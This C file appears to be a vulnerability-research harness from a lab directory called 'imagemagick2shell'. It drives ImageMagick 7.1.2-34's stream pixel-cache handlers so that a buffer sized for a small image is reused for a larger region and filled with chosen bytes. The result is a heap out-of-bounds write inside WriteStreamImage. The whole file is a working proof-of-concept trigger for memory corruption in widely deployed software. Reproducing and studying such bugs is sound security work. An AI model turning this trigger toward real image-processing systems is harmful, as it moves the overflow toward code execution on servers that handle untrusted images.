/*
 * lab/frontier/imagemagick2shell/harness.c
 *
 * Drives ImageMagick 7.1.2-34's real MagickCore stream pixel-cache handlers.
 * Including stream.c gives access to the file-static handlers
 * QueueAuthenticPixelsStream / SyncAuthenticPixelsStream / WriteStreamImage,
 * so the harness exercises the same code the coder uses during ReadStream().
 *
 * Usage: harness <small-W> <small-H> <big-W> <big-H> [control]
 *   attack (default): initial small handler allocation, then a larger region.
 *   control: second region is the same size as the first.
 */
#include "MagickCore/studio.h"
#include <unistd.h>

#include "MagickCore/blob-private.h"

#include "MagickCore/stream.c"

static Quantum byte_quantum(unsigned char b)
{
#if MAGICKCORE_QUANTUM_DEPTH == 16
  return((Quantum) ((MagickRealType) b*(MagickRealType) 257.0));
#else
  return((Quantum) b);
#endif
}

int main(int argc,char **argv)
{
  ExceptionInfo
    *exception;

  Image
    *image;

  ImageInfo
    *image_info;

  Quantum
    *q;

  StreamInfo
    *stream_info;

  size_t
    small_w,small_h,big_w,big_h,i,nch;

  MagickBooleanType
    control=MagickFalse;

  MagickCoreGenesis("frontier-imagemagick2shell",MagickFalse);
  exception=AcquireExceptionInfo();
  image_info=AcquireImageInfo();
  if (argc < 5)
    {
      (void) fprintf(stderr,"usage: %s smallW smallH bigW bigH [control]\n",
        argv[0]);
      return(2);
    }
  small_w=(size_t) strtoul(argv[1],(char **) NULL,10);
  small_h=(size_t) strtoul(argv[2],(char **) NULL,10);
  big_w=(size_t) strtoul(argv[3],(char **) NULL,10);
  big_h=(size_t) strtoul(argv[4],(char **) NULL,10);
  if ((argc > 5) && (strcmp(argv[5],"control") == 0))
    control=MagickTrue;

  stream_info=AcquireStreamInfo(image_info,exception);
  stream_info->quantum_info=AcquireQuantumInfo(image_info,(Image *) NULL);
  stream_info->exception=exception;

  {
    ImageInfo
      *out_info=AcquireImageInfo();
    (void) OpenStream(out_info,stream_info,"/dev/null",exception);
    out_info=DestroyImageInfo(out_info);
  }

  image=AcquireImage(image_info,exception);
  (void) SetImageExtent(image,small_w,small_h,exception);
  image->client_data=(void *) stream_info;
  /* OpenBlob installs image_info->stream on the image's BlobInfo, exactly as
     ReadStream() does, without opening a real file (FifoStream write mode). */
  image_info->stream=WriteStreamImage;
  if (OpenBlob(image_info,image,WriteBinaryBlobMode,exception) == MagickFalse)
    {
      (void) fprintf(stderr,"FAFAIL OpenBlob\n");
      return(3);
    }
  image->storage_class=DirectClass;

  ((CacheInfo *) image->cache)->storage_class=UndefinedClass;

  /*
    First queue: the morphology change calls WriteStreamImage with the
    small image geometry, allocating stream_info->pixels at that size.
  */
  q=QueueAuthenticPixelsStream(image,0,0,small_w,small_h,exception);
  if (q == (Quantum *) NULL)
    {
      (void) fprintf(stderr,"FAFAIL first queue\n");
      return(3);
    }
  fprintf(stderr,"FIRST small=%lux%lu pixels=%p columns=%lu rows=%lu\n",
    (unsigned long) small_w,(unsigned long) small_h,
    (void *) stream_info->pixels,
    (unsigned long) ((CacheInfo *) image->cache)->columns,
    (unsigned long) ((CacheInfo *) image->cache)->rows);

  fprintf(stderr,"DIAG image=%p si.image=%p cache_class=%d image_class=%d\n",
    (void *) image,(void *) stream_info->image,
    (int) ((CacheInfo *) image->cache)->storage_class,(int) image->storage_class);

  /*
    Second queue: same image pointer, larger region.  Vulnerable code keeps
    the old stream_info->pixels allocation because image == stream_info->image.
  */
  q=QueueAuthenticPixelsStream(image,0,0,big_w,big_h,exception);
  if (q == (Quantum *) NULL)
    {
      (void) fprintf(stderr,"FAFAIL second queue\n");
      return(4);
    }
  image->columns=big_w;
  image->rows=big_h;
  q=QueueAuthenticPixels(image,0,0,big_w,big_h,exception);
  if (q == (Quantum *) NULL)
    q=GetAuthenticPixels(image,0,0,big_w,big_h,exception);
  if (q != (Quantum *) NULL)
    {
      nch=(size_t) GetPixelChannels(image);
      for (i=0; i < big_w*big_h; i++)
        {
          size_t j;
          unsigned char b=(unsigned char) (0x41+(i%26));
          for (j=0; j < nch; j++)
            q[i*nch+j]=byte_quantum(b);
        }
      (void) SyncAuthenticPixels(image,exception);
    }
  fprintf(stderr,"QUEUE pixels=%p queue=%p extent=%lu\n",
    (void *) stream_info->pixels,(void *) q,
    (unsigned long) GetImageExtent(image));
  fprintf(stderr,"SECOND big=%lux%lu pixels=%p columns=%lu rows=%lu control=%d\n",
    (unsigned long) big_w,(unsigned long) big_h,(void *) stream_info->pixels,
    (unsigned long) ((CacheInfo *) image->cache)->columns,
    (unsigned long) ((CacheInfo *) image->cache)->rows,(int) control);

  /*
    Sync calls WriteStreamImage with the enlarged cache geometry: the real
    out-of-bounds write happens inside that function.
  */
  (void) SyncAuthenticPixelsStream(image,exception);
  fprintf(stderr,"SYNC DONE severity=%d\n",(int) exception->severity);
  if (stream_info->pixels != (unsigned char *) NULL)
    {
      size_t k,limit=3*small_w*small_h;
      if (limit > 32)
        limit=32;
      fprintf(stderr,"PIXELS bytes:");
      for (k=0; k < limit; k++)
        fprintf(stderr," %02x",(unsigned int) stream_info->pixels[k]);
      fprintf(stderr,"\n");
    }
  /* Teardown of this FifoStream harness trips an upstream memory-accounting
     assert unrelated to the bug; observation is complete, exit directly. */
  _exit(0);
}
